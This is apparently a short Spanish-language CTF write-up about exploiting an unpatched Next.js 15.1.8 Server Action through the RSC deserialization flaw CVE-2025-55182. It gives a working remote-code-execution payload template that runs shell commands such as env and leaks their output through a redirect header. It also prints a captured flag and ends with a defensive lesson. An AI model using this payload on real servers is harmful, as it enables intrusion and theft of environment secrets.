# Chapter 1: Act-er

## Descubrimiento

`intro.salvor.nren.tcc` enlaza con `dsrepos.salvor.nren.tcc`. El formulario de búsqueda usa una Server Action de Next.js. La respuesta y los paquetes descargados indicaron Next `15.1.8` con el deserializador RSC vulnerable (React2Shell / CVE-2025-55182).

## Explotación

Se envió una petición `multipart/form-data` no autenticada con el campo `then` apuntando a `__proto__:then` y el getter `constructor:constructor`. El prefijo de acción ejecutó un comando Node y lanzó una redirección; la salida se recuperó en el encabezado `x-action-redirect` codificada en Base64.

Esquema del comando usado (se sustituyó `<comando>` por `id`, `pwd` y `env`):

```text
var o=Buffer.from(process.mainModule.require('child_process')
  .execSync('<comando>')).toString('base64');
var e=new Error();
e.digest='NEXT_REDIRECT;push;http://x/'+o+';307;';
throw e;
```

La ejecución devolvió `uid=998(dsrepos)` y la variable de entorno:

```text
FLAG=FLAG{2cgd-Jb3C-0Tib-Iol9}
```

La flag fue enviada y aceptada por CTFd.

## Lección

Una Server Action no debe aceptar deserialización de modelos RSC sin la versión corregida de React/Next ni confiar en campos controlados por el cliente.
